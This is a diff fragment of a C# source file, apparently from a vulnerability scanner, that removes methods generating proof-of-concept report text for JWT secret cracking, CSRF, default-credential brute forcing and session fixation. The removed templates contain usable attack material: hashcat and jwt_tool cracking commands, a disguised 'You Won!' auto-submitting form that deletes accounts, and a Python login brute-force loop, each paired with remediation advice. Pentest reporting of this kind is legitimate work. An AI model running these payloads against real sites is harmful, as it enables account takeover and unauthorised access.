-2. Use jwt_tool or hashcat:
-```bash
-# JWT Tool
-jwt_tool JWT_HERE -C -d secrets.txt
-
-# Hashcat
-hashcat -m 16500 -a 0 jwt.txt wordlist.txt
-
-# John the Ripper
-john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
-```
-
-3. Common Weak Secrets:
-   - secret
-   - password
-   - 123456
-   - qwerty
-   - jwt_secret
-
-4. Once cracked, forge admin JWT
-
-Impact:
-   - Complete authentication bypass
-   - Account takeover
-   - Privilege escalation
-
-Remediation:
-   - Use secrets ≥256 bits
-   - Random generation
-   - Regular rotation
-   - Consider asymmetric algorithms (RS256)";
-        }
-
-        private string GenerateCSRFPoC(string url, string method)
-        {
-            return $@"Cross-Site Request Forgery (CSRF) PoC:
-
-Target URL: {url}
-Method: {method}
-
-Attack Page (csrf.html):
-```html
-<!DOCTYPE html>
-<html>
-<body>
-<h1>You Won! Claim Your Prize!</h1>
-<form id=""csrf"" action=""{url}"" method=""{method}"">
-    <input type=""hidden"" name=""action"" value=""delete_account"">
-    <input type=""hidden"" name=""confirm"" value=""yes"">
-</form>
-<script>
-    document.getElementById('csrf').submit();
-</script>
-</body>
-</html>
-```
-
-JavaScript CSRF:
-```javascript
-fetch('{url}', {{
-    method: '{method}',
-    credentials: 'include',
-    body: 'action=delete_account'
-}});
-```
-
-Attack Scenarios:
-
-1. Account Takeover:
-   - Change email
-   - Change password
-   - Add attacker as admin
-
-2. Financial Fraud:
-   - Transfer money
-   - Purchase items
-   - Change billing info
-
-3. Data Manipulation:
-   - Delete content
-   - Modify settings
-   - Create backdoors
-
-Impact:
-   - Unauthorized actions
-   - Financial loss
-   - Data compromise
-   - Account takeover
-
-Remediation:
-   - Implement CSRF tokens
-   - SameSite cookie attribute
-   - Verify Origin/Referer headers
-   - Double-submit cookies
-   - Custom headers for AJAX";
-        }
-
-        private string GenerateWeakCredentialsPoC(string loginUrl, string username, string password)
-        {
-            return $@"Weak Default Credentials PoC:
-
-Login URL: {loginUrl}
-Username: {username}
-Password: {password}
-
-Automated Attack:
-```python
-import requests
-
-url = ""{loginUrl}""
-weak_creds = [
-    ('admin', 'admin'),
-    ('admin', 'password'),
-    ('administrator', 'administrator'),
-    ('root', 'root'),
-    ('user', 'user')
-]
-
-for user, pwd in weak_creds:
-    data = {{'username': user, 'password': pwd}}
-    response = requests.post(url, data=data)
-    if 'login' not in response.text.lower():
-        print(f""Success: {{user}}/{{pwd}}"")
-```
-
-Impact:
-   - Instant administrative access
-   - Complete system compromise
-   - Data breach
-   - Service disruption
-
-Remediation:
-   - Force password change on first login
-   - Implement strong password policy
-   - No default credentials
-   - Account lockout after failed attempts
-   - Multi-factor authentication";
-        }
-
-        private string GenerateSessionFixationPoC(string url)
-        {
-            return $@"Session Fixation PoC:
-
-Target URL: {url}
-
-Attack Steps:
-
-1. Attacker Obtains Session ID:
-   GET {url}
-   → Set-Cookie: PHPSESSID=attacker_controlled_id
-
-2. Attacker Sends Link to Victim:
-   {url}?PHPSESSID=attacker_controlled_id
-   Or: Set cookie via XSS
-
-3. Victim Logs In:
-   Session ID: attacker_controlled_id (unchanged)
-
-4. Attacker Uses Same Session:
-   Cookie: PHPSESSID=attacker_controlled_id
-   → Authenticated as victim
-
-Impact:
-   - Account hijacking
-   - Session takeover
-   - Unauthorized access
-
-Remediation:
-   - Regenerate session ID after authentication
-   - Validate session ownership
-   - Use secure, httpOnly cookies
-   - Implement session timeout";
+            return sb.ToString();
         }
 
         #endregion
